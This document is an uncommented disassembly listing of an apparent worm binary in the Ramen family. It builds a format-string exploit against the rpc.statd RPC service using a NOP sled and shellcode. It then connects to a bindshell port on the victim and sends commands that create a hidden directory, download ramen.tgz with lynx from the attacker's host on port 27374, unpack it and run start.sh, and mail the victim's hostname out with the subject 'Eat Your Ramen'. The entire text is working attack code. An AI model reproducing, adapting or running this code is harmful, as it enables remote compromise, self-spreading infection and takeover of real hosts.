xor ebp, ebp
pop esi
mov ecx, esp
and esp, 0xfffffff8
push eax
push esp
push edx
push loc.gcc2_compiled._3
push sym._init
push ecx
push esi
push main
call sym.imp.__libc_start_main
jmp dword [reloc.__libc_start_main]
push ebp
mov edx, dword [obj.completed.1]
mov ebp, esp
sub esp, 8
test edx, edx
jne 0x8048c3b
mov edx, dword [obj.p.0]
mov eax, dword [edx]
test eax, eax
je 0x8048c18
lea esi, [esi]
lea eax, [edx + 4]
mov edx, dword [edx]
mov dword [obj.p.0], eax
call edx
mov edx, dword [obj.p.0]
mov ecx, dword [edx]
test ecx, ecx
jne 0x8048c00
mov eax, sym.imp.__deregister_frame_info
test eax, eax
je 0x8048c31
sub esp, 0xc
push obj.__EH_FRAME_BEGIN__
call sym.imp.__deregister_frame_info
add esp, 0x10
mov eax, 1
mov dword [obj.completed.1], eax
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 8
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
mov eax, sym.imp.__register_frame_info
sub esp, 8
test eax, eax
je 0x8048c74
sub esp, 8
push obj.object.2
push obj.__EH_FRAME_BEGIN__
call sym.imp.__register_frame_info
add esp, 0x10
mov esp, ebp
pop ebp
ret
jmp dword [reloc.__register_frame_info]
push ebp
mov ebp, esp
sub esp, 8
mov esp, ebp
pop ebp
ret
push ebp
mov eax, dword [obj.__CTOR_LIST__]
mov ebp, esp
push ebx
sub esp, 4
cmp eax, 0xffffffff
mov ebx, obj.__CTOR_LIST__
je 0x80499dc
lea esi, [esi]
lea edi, [edi]
sub ebx, 4
call eax
mov eax, dword [ebx]
cmp eax, 0xffffffff
jne 0x80499d0
pop eax
pop ebx
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 8
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 4
mov dword [var_4h], 0
lea esi, [esi]
mov eax, dword [var_4h]
add eax, dword [arg_8h]
cmp byte [eax], 0
jne 0x8048cac
jmp 0x8048cc8
lea esi, [esi]
mov eax, dword [var_4h]
mov edx, dword [arg_8h]
add edx, eax
mov eax, dword [var_4h]
add eax, dword [arg_8h]
mov al, byte [eax]
inc eax
mov byte [edx], al
lea eax, [var_4h]
inc dword [eax]
jmp 0x8048c9c
mov esi, esi
leave
ret
push ebp
mov ebp, esp
sub esp, 8
sub esp, 0xc
push 0
call sym.imp.exit
jmp dword [reloc.exit]
push ebp
mov ebp, esp
push edi
push esi
sub esp, 0x800
lea eax, [var_8h]
sub eax, 0x4c0
lea eax, [buffer]
mov dword [var_7ach], eax
mov dword [var_7b0h], str.mkdir__usr_src_.poop_cd__usr_src_.poop_n
cld
mov dword [var_7b4h], 0xa
mov edi, dword [var_7ach]
mov esi, dword [var_7b0h]
mov ecx, dword [var_7b4h]
rep movsd dword es:[edi], dword ptr [esi]
lea eax, [var_8h]
sub eax, 0x4e0
lea eax, [var_4e8h]
mov dword [var_7b8h], eax
mov dword [var_7bch], str.export_TERMvt100_n
cld
mov dword [var_7c0h], 0x13
mov edi, dword [var_7b8h]
mov esi, dword [var_7bch]
mov ecx, dword [var_7c0h]
rep movsb byte es:[edi], byte ptr [esi]
lea eax, [var_8h]
sub eax, 0x630
lea eax, [var_638h]
mov dword [var_7c4h], eax
mov dword [var_7c8h], str.cp_ramen.tgz__tmp_n
cld
mov dword [var_7cch], 0x13
mov edi, dword [var_7c4h]
mov esi, dword [var_7c8h]
mov ecx, dword [var_7cch]
rep movsb byte es:[edi], byte ptr [esi]
lea eax, [var_8h]
sub eax, 0x670
lea eax, [var_678h]
mov dword [var_7d0h], eax
mov dword [var_7d4h], str.gzip__d_ramen.tgz_tar__xvf_ramen.tar_._start.sh_n
cld
mov dword [var_7d8h], 0x31
mov edi, dword [var_7d0h]
mov esi, dword [var_7d4h]
mov ecx, dword [var_7d8h]
rep movsb byte es:[edi], byte ptr [esi]
sub esp, 0xc
push dword [obj.stdin]
call sym.imp.fileno
add esp, 0x10
mov dword [var_7e0h], eax
mov eax, dword [var_7e0h]
cmp eax, dword [socket]
jle 0x8048f80
sub esp, 0xc
push dword [obj.stdin]
call sym.imp.fileno
add esp, 0x10
mov dword [var_7e4h], eax
mov ecx, dword [var_7e4h]
inc ecx
mov dword [var_7dch], ecx
jmp 0x8048f8a
nop
mov esi, dword [socket]
inc esi
mov dword [var_7dch], esi
mov edi, dword [var_7dch]
mov dword [var_40ch], edi
sub esp, 0xc
push obj.email1
call loc.gcc2_compiled._4
add esp, 0x10
sub esp, 0xc
push obj.email2
call loc.gcc2_compiled._4
add esp, 0x10
sub esp, 0xc
push obj.passwerd
call loc.gcc2_compiled._4
add esp, 0x10
call sym.whatsmyip
sub esp, 4
push obj.myip
push str.lynx__source_http:___s:27374____usr_src_.poop_ramen.tgz_n
lea eax, [s]
push eax
call sym.imp.sprintf
add esp, 0x10
sub esp, 0xc
push obj.email1
push obj.email2
push dword [obj.hostname]
push str.echo_Eat_Your_Ramen___mail__s__s__c__s__s_n
lea eax, [var_7a8h]
push eax
call sym.imp.sprintf
add esp, 0x20
push 0
lea eax, [buffer]
sub esp, 8
push eax
call sym.imp.strlen
add esp, 0xc
mov dword [length], eax
mov eax, dword [length]
push eax
lea eax, [buffer]
push eax
push dword [socket]
call sym.imp.send
add esp, 0x10
push 0
lea eax, [var_4e8h]
sub esp, 8
push eax
call sym.imp.strlen
add esp, 0xc
mov dword [var_7ech], eax
mov eax, dword [var_7ech]
push eax
lea eax, [var_4e8h]
push eax
push dword [socket]
call sym.imp.send
add esp, 0x10
push 0
lea eax, [s]
sub esp, 8
push eax
call sym.imp.strlen
add esp, 0xc
mov dword [var_7f0h], eax
mov eax, dword [var_7f0h]
push eax
lea eax, [s]
push eax
push dword [socket]
call sym.imp.send
add esp, 0x10
push 0
lea eax, [var_638h]
sub esp, 8
push eax
call sym.imp.strlen
add esp, 0xc
mov dword [var_7f4h], eax
mov eax, dword [var_7f4h]
push eax
lea eax, [var_638h]
push eax
push dword [socket]
call sym.imp.send
add esp, 0x10
push 0
lea eax, [var_678h]
sub esp, 8
push eax
call sym.imp.strlen
add esp, 0xc
mov dword [var_7f8h], eax
mov eax, dword [var_7f8h]
push eax
lea eax, [var_678h]
push eax
push dword [socket]
call sym.imp.send
add esp, 0x10
push 0
lea eax, [var_7a8h]
sub esp, 8
push eax
call sym.imp.strlen
add esp, 0xc
mov dword [var_7fch], eax
mov eax, dword [var_7fch]
push eax
lea eax, [var_7a8h]
push eax
push dword [socket]
call sym.imp.send
add esp, 0x10
sub esp, 0xc
push 0x7270e00
call sym.imp.usleep
add esp, 0x10
sub esp, 0xc
push 0
call sym.imp.exit
push ebp
mov ebp, esp
sub esp, 8
sub esp, 8
push dword [arg_ch]
push dword [arg_8h]
call sym.xdr_res
add esp, 0x10
mov dword [var_4h], eax
cmp dword [var_4h], 0
jne 0x8048df8
mov eax, 0
jmp 0x8048e25
nop
sub esp, 8
mov eax, dword [arg_ch]
add eax, 4
push eax
push dword [arg_8h]
call sym.imp.xdr_int
add esp, 0x10
mov dword [var_8h], eax
cmp dword [var_8h], 0
jne 0x8048e20
mov eax, 0
jmp 0x8048e25
lea esi, [esi]
mov eax, 1
leave
ret
push ebp
mov ebp, esp
push ebx
push eax
call 0x8048912
pop ebx
add ebx, 0x24fa
mov eax, dword [ebx + 0xa4]
test eax, eax
je 0x8048925
call eax
lea esi, [esi]
call sym.frame_dummy
call loc.gcc2_compiled._2
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 8
sub esp, 4
push 0x400
push dword [arg_ch]
push dword [arg_8h]
call sym.imp.xdr_string
add esp, 0x10
mov dword [var_4h], eax
cmp dword [var_4h], 0
jne 0x8048d98
mov eax, 0
jmp 0x8048d9d
mov eax, 1
leave
ret
push ebp
mov ebp, esp
push edi
push esi
sub esp, 0xa0
mov dword [var_4ch], 0xffffffff
mov dword [var_50h], 0
mov dword [var_54h], 5
mov dword [var_58h], 9
mov dword [var_5ch], 0x258
mov dword [var_60h], 0x400
mov dword [var_68h], obj.shellcode
mov word [var_6ah], 0
mov dword [var_70h], 0
mov dword [var_74h], 0xffffffff
mov dword [obj.opterr], 0
mov esi, esi
sub esp, 4
push str.tp:a:l:o:w:s:d:
push dword [argv]
push dword [argc]
call sym.imp.getopt
add esp, 0x10
mov dword [var_ch], eax
cmp dword [var_ch], 0xffffffff
jne 0x8049560
jmp 0x80496a0
mov eax, dword [var_ch]
sub eax, 0x61
mov dword [var_90h], eax
cmp dword [var_90h], 0x16
ja case.0x8049586.1
mov edx, dword [var_90h]
mov eax, dword [edx*4 + 0x8049c40]
jmp eax
mov dword [var_50h], 1
jmp 0x804953c
lea esi, [esi]
sub esp, 4
lea eax, [var_6ah]
push eax
push 0x8049bf2
push dword [obj.optarg]
call sym.imp.sscanf
add esp, 0x10
jmp 0x804953c
sub esp, 4
lea eax, [var_70h]
push eax
push 0x8049bf6
push dword [obj.optarg]
call sym.imp.sscanf
add esp, 0x10
jmp 0x804953c
nop
sub esp, 0xc
push dword [obj.optarg]
call sym.imp.atoi
add esp, 0x10
mov dword [var_7ch], eax
mov eax, dword [var_7ch]
mov dword [var_60h], eax
jmp 0x804953c
nop
sub esp, 0xc
push dword [obj.optarg]
call sym.imp.atoi
add esp, 0x10
mov dword [var_80h], eax
mov eax, dword [var_80h]
mov dword [var_5ch], eax
jmp 0x804953c
nop
sub esp, 0xc
push dword [obj.optarg]
call sym.imp.atoi
add esp, 0x10
mov dword [var_84h], eax
mov eax, dword [var_84h]
mov dword [var_54h], eax
jmp 0x804953c
lea esi, [esi]
sub esp, 0xc
push dword [obj.optarg]
call sym.imp.atoi
add esp, 0x10
mov dword [var_88h], eax
mov eax, dword [var_88h]
mov dword [var_58h], eax
jmp 0x804953c
lea esi, [esi]
sub esp, 0xc
push dword [obj.optarg]
call sym.imp.atoi
add esp, 0x10
mov dword [var_8ch], eax
mov eax, dword [var_8ch]
mov dword [var_4ch], eax
jmp 0x804953c
lea esi, [esi]
sub esp, 0xc
mov eax, dword [argv]
push dword [eax]
call sym.usage
add esp, 0x10
jmp 0x804953c
lea esi, [esi]
mov eax, dword [obj.optind]
imul edx, eax, 4
mov eax, dword [argv]
mov eax, dword [eax + edx]
mov dword [var_64h], eax
test eax, eax
jne 0x80496c0
sub esp, 0xc
push 1
call sym.imp.exit
nop
mov eax, dword [obj.optind]
imul edx, eax, 4
mov eax, dword [argv]
mov eax, dword [eax + edx]
mov dword [obj.hostname], eax
cmp dword [var_4ch], 0
js 0x8049779
cmp dword [var_4ch_2], 2
jbe 0x80496f0
sub esp, 0xc
push 1
call sym.imp.exit
lea esi, [esi]
mov edx, dword [var_4ch_2]
mov eax, edx
shl eax, 3
sub eax, edx
lea edx, [eax*4]
mov eax, 0x804ad90
mov eax, dword [edx + eax]
mov dword [var_68h_2], eax
mov edx, dword [var_4ch_2]
mov eax, edx
shl eax, 3
sub eax, edx
lea edx, [eax*4]
mov eax, 0x804ad94
mov eax, dword [edx + eax]
mov dword [var_70h_2], eax
mov edx, dword [var_4ch_2]
mov eax, edx
shl eax, 3
sub eax, edx
shl eax, 2
lea edx, [eax + 0x10]
mov eax, obj.types
mov eax, dword [edx + eax]
mov dword [var_60h_2], eax
mov edx, dword [var_4ch_2]
mov eax, edx
shl eax, 3
sub eax, edx
shl eax, 2
lea edx, [eax + 0x10]
mov eax, 0x804ad8c
mov eax, dword [edx + eax]
mov dword [var_5ch_2], eax
mov edx, dword [var_4ch_2]
mov eax, edx
shl eax, 3
sub eax, edx
shl eax, 2
lea edx, [eax + 0x10]
mov eax, 0x804ad90
mov eax, dword [edx + eax]
mov dword [var_58h_2], eax
cmp dword [var_70h], 0
jne 0x804978c
sub esp, 0xc
push 1
call sym.imp.exit
lea esi, [esi]
sub esp, 8
push 0x10
lea eax, [s]
push eax
call sym.imp.bzero
add esp, 0x10
mov word [s], 2
movzx eax, word [var_6ah]
sub esp, 0xc
push eax
call sym.imp.htons
add esp, 0x10
mov word [var_92h], ax
mov ax, word [var_92h]
mov word [var_46h], ax
lea eax, [var_78h]
sub esp, 8
push dword [var_64h]
push eax
call sym.getip
add esp, 0xc
mov eax, dword [var_78h]
mov dword [var_44h], eax
mov eax, dword [var_54h]
mov dword [var_20h], eax
mov dword [var_1ch], 0
cmp dword [var_50h], 0
jne 0x8049860
sub esp, 8
lea eax, [var_74h_2]
push eax
push dword [var_1ch_2]
push dword [var_20h_2]
push 1
push 0x186b8
lea eax, [var_48h_2]
push eax
call sym.imp.clntudp_create
add esp, 0x20
mov dword [var_14h_2], eax
cmp dword [var_14h_2], 0
jne 0x8049834
sub esp, 0xc
push str.clntudp_create__
call sym.imp.clnt_pcreateerror
add esp, 0x10
sub esp, 0xc
push 1
call sym.imp.exit
nop
mov dword [var_28h], 2
mov dword [var_24h], 0
sub esp, 4
mov eax, dword [var_14h_2]
mov edx, dword [eax + 4]
lea eax, [var_28h]
push eax
push 4
push dword [var_14h_2]
mov eax, dword [edx + 0x14]
call eax
add esp, 0x10
jmp 0x80498a4
mov esi, esi
sub esp, 8
push 0
push 0
lea eax, [var_74h]
push eax
push 1
push 0x186b8
lea eax, [s]
push eax
call sym.imp.clnttcp_create
add esp, 0x20
mov dword [var_14h], eax
cmp dword [var_14h], 0
jne 0x80498a4
sub esp, 0xc
push str.clnttcp_create__
call sym.imp.clnt_pcreateerror
add esp, 0x10
sub esp, 0xc
push 1
call sym.imp.exit
lea esi, [esi]
sub esp, 0xc
push 0
push 0
push 0
push 0
push str.localhost
call sym.imp.authunix_create
add esp, 0x20
mov dword [var_98h], eax
mov eax, dword [var_14h]
mov ecx, dword [var_98h]
mov dword [eax], ecx
sub esp, 0xc
push dword [var_58h]
push dword [var_5ch]
push dword [var_60h]
push dword [var_70h]
push dword [var_68h]
call sym.wizardry
add esp, 0x20
mov dword [ptr], eax
mov eax, dword [ptr]
mov dword [var_2ch], eax
mov eax, dword [var_14h]
mov edx, dword [eax + 4]
push dword [var_1ch]
push dword [var_20h]
lea eax, [var_38h]
push eax
push sym.xdr_sm_stat_res
lea eax, [var_2ch]
push eax
push sym.xdr_sm_name
push 1
push dword [var_14h]
mov eax, dword [edx]
call eax
add esp, 0x20
mov dword [var_18h], eax
cmp dword [var_18h], 0
je 0x804997c
sub esp, 8
push str.clnt_call__
push dword [var_14h]
call sym.imp.clnt_perror
add esp, 0x10
sub esp, 0xc
push 5
call sym.imp.sleep
add esp, 0x10
sub esp, 0x10
mov dword [var_9ch], esp
lea esi, [var_48h_2]
mov dword [var_a0h], esi
cld
mov dword [var_a4h], 4
mov edi, dword [var_9ch_2]
mov esi, dword [var_a0h]
mov ecx, dword [var_a4h]
rep movsd dword es:[edi], dword ptr [esi]
call sym.connection
add esp, 0x10
sub esp, 0xc
push dword [ptr]
call sym.imp.free
add esp, 0x10
sub esp, 0xc
mov eax, dword [var_14h]
mov eax, dword [eax + 4]
push dword [var_14h]
mov eax, dword [eax + 0x10]
call eax
add esp, 0x10
mov eax, 0xffffffff
lea esp, [var_8h]
pop esi
pop edi
pop ebp
ret
jmp dword [reloc.getopt]
jmp dword [reloc.sscanf]
jmp dword [reloc.atoi]
jmp dword [reloc.bzero]
jmp dword [reloc.htons]
push ebp
mov ebp, esp
sub esp, 8
sub esp, 0xc
push dword [arg_ch]
call sym.imp.gethostbyname
add esp, 0x10
mov dword [var_4h], eax
cmp dword [var_4h], 0
jne 0x80494c0
sub esp, 0xc
push str.gethostbyname__
call sym.imp.herror
add esp, 0x10
sub esp, 0xc
push 1
call sym.imp.exit
nop
mov eax, dword [var_4h]
mov eax, dword [eax + 0x10]
mov eax, dword [eax]
sub esp, 4
push 4
push eax
push dword [s1]
call sym.imp.memcpy
add esp, 0x10
mov eax, dword [s1]
leave
ret 4
jmp dword [reloc.gethostbyname]
jmp dword [reloc.herror]
jmp dword [reloc.memcpy]
jmp dword [reloc.clntudp_create]
jmp dword [reloc.clnt_pcreateerror]
jmp dword [reloc.clnttcp_create]
jmp dword [reloc.authunix_create]
push ebp
mov ebp, esp
push ebx
sub esp, 0x54
nop
mov eax, dword [arg_ch]
and eax, 3
test eax, eax
jne 0x8049208
jmp 0x8049210
lea eax, [arg_ch]
dec dword [eax]
jmp 0x80491fc
nop
mov eax, dword [size]
add eax, dword [arg_ch]
add eax, 4
mov dword [var_24h], eax
mov al, byte [var_24h]
mov byte [var_15h], al
cmp byte [var_15h], 0
je 0x8049230
cmp byte [var_15h], 0x24
je 0x8049230
jmp 0x804923c
sub esp, 0xc
push 1
call sym.imp.exit
mov esi, esi
mov dword [var_10h], 0x18
mov edx, dword [var_10h]
mov eax, dword [size]
sub eax, edx
dec eax
mov dword [size], eax
sub esp, 0xc
mov eax, dword [size]
inc eax
push eax
call sym.imp.malloc
add esp, 0x10
mov dword [var_1ch], eax
mov eax, dword [var_1ch]
mov dword [var_1ch], eax
test eax, eax
jne 0x8049288
sub esp, 0xc
push str.malloc__
call sym.imp.perror
add esp, 0x10
sub esp, 0xc
push 1
call sym.imp.exit
mov esi, esi
mov eax, dword [var_1ch]
mov dword [dest], eax
sub esp, 4
push dword [size]
push 0x90
push dword [dest]
call sym.imp.memset
add esp, 0x10
mov dword [var_8h], 0
nop
cmp dword [var_8h], 3
jle 0x80492b4
jmp 0x8049318
mov dword [var_ch], 0
nop
cmp dword [var_ch], 3
jle 0x80492f4
sub esp, 4
push 4
mov eax, dword [dest]
sub eax, 4
push eax
push dword [dest]
call sym.imp.memcpy
add esp, 0x10
lea eax, [dest]
add dword [eax], 4
lea eax, [var_10h]
add dword [eax], 8
lea eax, [var_8h]
inc dword [eax]
lea eax, [var_24h]
inc dword [eax]
jmp 0x80492ac
lea esi, [esi]
mov edx, dword [dest]
mov eax, dword [var_ch]
mov eax, eax
shl eax, 3
mov dword [var_30h], eax
mov eax, dword [var_24h]
mov cl, byte [var_30h]
shr eax, cl
mov byte [edx], al
lea eax, [dest]
inc dword [eax]
lea eax, [var_ch]
inc dword [eax]
jmp 0x80492bc
lea eax, [var_24h]
sub dword [eax], 4
mov dword [var_8h], 0
lea esi, [esi]
mov eax, dword [var_8h]
cmp eax, dword [arg_18h]
jl 0x8049334
jmp 0x804935c
mov esi, esi
sub esp, 4
push 3
push 0x8049bbe
push dword [dest]
call sym.imp.strncpy
add esp, 0x10
lea eax, [dest]
add dword [eax], 3
lea eax, [var_10h]
add dword [eax], 8
lea eax, [var_8h]
inc dword [eax]
jmp 0x8049328
mov eax, dword [arg_14h]
add eax, dword [arg_ch]
mov dword [var_28h], eax
mov dword [var_8h], 0
cmp dword [var_8h], 3
jle 0x8049378
jmp 0x8049428
nop
mov eax, dword [var_8h]
mov eax, eax
shl eax, 3
mov dword [var_34h], eax
mov eax, dword [var_28h]
mov cl, byte [var_34h]
shr eax, cl
and eax, 0xff
mov dword [var_14h], eax
movzx eax, byte [var_10h]
cmp dword [var_14h], eax
jne 0x80493b8
sub esp, 8
push str.__n__n
push dword [dest]
call sym.imp.sprintf
add esp, 0x10
lea eax, [dest]
add dword [eax], 4
jmp 0x804941d
nop
mov eax, dword [var_14h]
cmp eax, dword [var_10h]
jl 0x80493e0
mov eax, dword [var_14h]
mov dword [var_38h], eax
lea edx, [var_10h]
mov dword [var_4ch], edx
mov eax, dword [var_38h]
mov ecx, dword [var_4ch]
cdq
idiv dword [ecx]
mov dword [var_3ch], edx
cmp dword [var_3ch], 8
jle 0x80493e0
jmp 0x80493ec
lea eax, [var_14h]
add dword [eax], 0x100
jmp 0x80493b8
nop
mov edx, dword [var_10h]
lea eax, [var_14h]
sub dword [eax], edx
mov edx, dword [var_14h]
lea eax, [var_10h]
add dword [eax], edx
sub esp, 4
push dword [var_14h]
push str.___dx__n
push dword [dest]
call sym.imp.sprintf
add esp, 0x10
mov dword [var_2ch], eax
mov edx, dword [var_2ch]
lea eax, [dest]
add dword [eax], edx
lea eax, [var_8h]
inc dword [eax]
jmp 0x804936c
nop
mov eax, dword [dest]
mov byte [eax], 0x90
sub esp, 4
sub esp, 8
push dword [s]
call sym.imp.strlen
add esp, 0xc
mov dword [var_40h], eax
mov eax, dword [var_40h]
push eax
push dword [s]
mov eax, dword [size]
mov ebx, dword [var_1ch]
add ebx, eax
push dword [s]
call sym.imp.strlen
add esp, 4
mov dword [var_44h], eax
mov eax, dword [var_44h]
sub ebx, eax
mov eax, ebx
push eax
call sym.imp.memcpy
add esp, 0x10
mov eax, dword [size]
add eax, dword [var_1ch]
mov byte [eax], 0
mov eax, dword [var_1ch]
mov dword [var_48h], eax
mov eax, dword [var_48h]
mov ebx, dword [var_4h]
leave
ret
jmp dword [reloc.malloc]
jmp dword [reloc.perror]
jmp dword [reloc.memset]
jmp dword [reloc.strncpy]
jmp dword [reloc.sprintf]
jmp dword [reloc.strlen]
jmp dword [reloc.clnt_perror]
jmp dword [reloc.sleep]
push ebp
mov ebp, esp
sub esp, 0x18
sub esp, 0xc
push 0x9900
call sym.imp.htons
add esp, 0x10
mov word [var_6h], ax
mov ax, word [var_6h]
mov word [arg_ah], ax
sub esp, 4
push 6
push 1
push 2
call sym.imp.socket
add esp, 0x10
mov dword [fildes], eax
cmp dword [fildes], 0
jns 0x80491b4
sub esp, 0xc
push str.socket__
call sym.imp.perror
add esp, 0x10
sub esp, 0xc
push 1
call sym.imp.exit
mov esi, esi
sub esp, 4
push 0x10
lea edx, [addr]
mov eax, edx
push eax
push dword [fildes]
call sym.imp.connect
add esp, 0x10
mov dword [var_ch], eax
cmp dword [var_ch], 0
jne 0x80491e1
sub esp, 0xc
push dword [fildes]
call sym.runshell
add esp, 0x10
sub esp, 0xc
push dword [fildes]
call sym.imp.close
add esp, 0x10
leave
ret
jmp dword [reloc.socket]
jmp dword [reloc.connect]
jmp dword [reloc.close]
jmp dword [reloc.free]
push ebp
mov ebp, esp
sub esp, 8
sub esp, 8
push dword [arg_ch]
push dword [arg_8h]
call sym.imp.xdr_enum
add esp, 0x10
mov dword [var_4h], eax
cmp dword [var_4h], 0
jne 0x8048dc8
mov eax, 0
jmp 0x8048dcd
nop
mov eax, 1
leave
ret
push ebp
mov ebp, esp
push ebx
push edx
call 0x80499f6
pop ebx
add ebx, 0x1416
lea esi, [esi]
call loc.gcc2_compiled._1
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 0x38
sub esp, 8
push 0x10
lea eax, [s]
push eax
call sym.imp.bzero
add esp, 0x10
sub esp, 8
push 0x8049a40
push str.myip
call sym.imp.fopen
add esp, 0x10
mov dword [stream], eax
sub esp, 4
push dword [stream]
push 0x10
lea eax, [s]
push eax
call sym.imp.fgets
add esp, 0x10
sub esp, 8
lea eax, [s]
push eax
push obj.myip
call sym.imp.strcpy
add esp, 0x10
sub esp, 0xc
push obj.myip
call sym.imp.strlen
add esp, 0x10
mov dword [var_2ch], eax
mov eax, dword [var_2ch]
lea edx, [eax - 1]
mov eax, obj.myip
cmp byte [edx + eax], 0xa
jne 0x8048d69
sub esp, 0xc
push obj.myip
call sym.imp.strlen
add esp, 0x10
mov dword [var_30h], eax
mov eax, dword [var_30h]
lea edx, [eax - 1]
mov eax, obj.myip
mov byte [edx + eax], 0
leave
ret
jmp dword [reloc.fopen]
jmp dword [reloc.fgets]
jmp dword [reloc.strcpy]
jmp dword [reloc.usleep]
jmp dword [reloc.fileno]
jmp dword [reloc.__deregister_frame_info]
jmp dword [reloc.xdr_enum]
jmp dword [reloc.__cxa_finalize]
jmp dword [reloc.send]
jmp dword [reloc.xdr_int]
jmp dword [reloc.xdr_string]
